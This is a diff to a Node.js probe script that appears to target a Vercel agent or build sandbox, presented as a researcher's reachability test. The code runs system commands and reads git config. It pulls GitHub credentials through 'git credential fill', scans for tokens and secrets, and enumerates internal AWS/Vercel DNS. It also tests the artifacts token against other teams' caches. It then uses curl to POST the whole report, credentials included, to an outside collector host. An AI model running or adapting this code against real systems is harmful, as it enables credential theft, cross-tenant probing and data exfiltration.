@@ -6,7 +6,7 @@
 //   (3) is a Vercel/project credential (VERCEL_OIDC_TOKEN, project env) reachable inside?
 // It does NOT hoard third-party secrets; it proves reachability, then we stop and report.
 
-import { readFileSync, existsSync } from "node:fs";
+import { readFileSync, existsSync, writeFileSync } from "node:fs";
 import { execSync } from "node:child_process";
 import { createDecipheriv } from "node:crypto";
 
@@ -126,7 +126,7 @@ function tryDecrypt(keyStr, contentStr) {
 }
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v15",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v16",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -538,7 +538,7 @@ const report = {
     credentialHelper: safe(() => execSync("git config --global credential.helper 2>/dev/null || true").toString().trim()),
     // Try to fill credentials for github.com via the credential helper
     credFill: safe(() => execSync(
-      "printf 'protocol=https\\nhost=github.com\\n' | git credential fill 2>/dev/null | head -10 || true"
+      "printf 'protocol=https\\nhost=github.com\\n' | timeout 5 git credential fill 2>/dev/null | head -10 || true"
     ).toString().trim()),
     // Check if osxkeychain or netrc or token-based auth is configured
     globalGitConfig: safe(() => execSync("git config --global --list 2>/dev/null | head -20 || true").toString().trim()),
@@ -683,18 +683,58 @@ const report = {
     // Check Vercel CLI package.json for version
     vercelPkg: safe(() => JSON.parse(readFileSync('/var/task/node_modules/vercel/package.json','utf8')).version || 'unknown'),
     // Check if vercel CLI has any auth config bundled
-    cliConfigDir: safe(() => execSync('find /var/task -name "config.json" -o -name "auth.json" 2>/dev/null | head -5 || true').toString().trim()),
-    // Does /var/task have any hardcoded tokens?
-    tokenScan: safe(() => execSync(`grep -r 'token\|secret\|key\|Bearer' /var/task/ --include="*.json" -l 2>/dev/null | head -5 || true`).toString().trim()),
+    cliConfigDir: safe(() => execSync('timeout 5 find /var/task -name "config.json" -o -name "auth.json" 2>/dev/null | head -5 || true').toString().trim()),
+    // Does /var/task have any hardcoded tokens? (timeout to avoid scanning GB of node_modules)
+    tokenScan: safe(() => execSync(`timeout 5 grep -r 'token\|secret\|key\|Bearer' /var/task/ --include="*.json" -l 2>/dev/null | head -5 || true`).toString().trim()),
   })),
+  // DNS internal enumeration via 172.31.0.2 (AWS VPC resolver in /etc/resolv.conf)
+  // Goal: resolve internal Vercel/AWS hostnames to map private IP space
+  dnsEnum: safe(() => {
+    const resolve = (host) => safe(() =>
+      execSync(`timeout 3 dig +short @172.31.0.2 ${host} 2>/dev/null || nslookup ${host} 172.31.0.2 2>/dev/null | tail -4 || true`).toString().trim().slice(0, 200)
+    );
+    return {
+      // Internal Vercel API
+      apiIad1: resolve('api-iad1.vercel.com'),
+      apiVercel: resolve('api.vercel.com'),
+      // Turborepo / suspense cache
+      suspenseCache: resolve('suspense-cache.vercel.com'),
+      // Build containers
+      buildContainersInternal: resolve('build-containers.vercel.internal'),
+      // AWS VPC service endpoints
+      ec2MetadataInternal: resolve('169.254.169.254'),
+      // Vercel private DNS zones
+      vercelInternal: resolve('vercel.internal'),
+      // Any .amazonaws.com services from inside the VPC
+      s3Internal: resolve('s3.amazonaws.com'),
+      ecr: resolve('ecr.us-east-1.amazonaws.com'),
+    };
+  }),
+  // Turborepo QUERY capability — POST batch hash existence check
+  // If no projectId scoping: could enumerate cache presence for other teams
+  artifactsQuery: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    if (!tok) return 'no-artifacts-token';
+    const ownerId = process.env.VERCEL_ARTIFACTS_OWNER || '';
+    const apiBase = 'https://vercel.com/api/v8/artifacts';
+    const queryBody = JSON.stringify({ hashes: ['beefdeadbeefdeadbeefdeadbeefdeadbeef1337', 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef'] });
+    safe(() => writeFileSync('/tmp/q_body.json', queryBody));
+    const queryStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_query -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' --data @/tmp/q_body.json '${apiBase}?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const queryBody2 = safe(() => readFileSync('/tmp/art_query', 'utf8').slice(0, 300));
+    return { queryStatus, queryBody: queryBody2 };
+  }),
 };
 
 const body = JSON.stringify(report);
 
 // Beacon to the researcher-controlled collector. If this arrives, egress is open.
+// Write to file first to avoid shell ARG_MAX limits with large JSON bodies.
+safe(() => writeFileSync('/tmp/probe_body.json', body));
 safe(() =>
   execSync(
-    `curl -s --max-time 5 -X POST -H 'Content-Type: application/json' --data @- ${COLLECTOR} <<'EOF'\n${body}\nEOF`
+    `curl -s --max-time 10 -X POST -H 'Content-Type: application/json' --data @/tmp/probe_body.json ${COLLECTOR} 2>/dev/null || true`
   )
 );
 
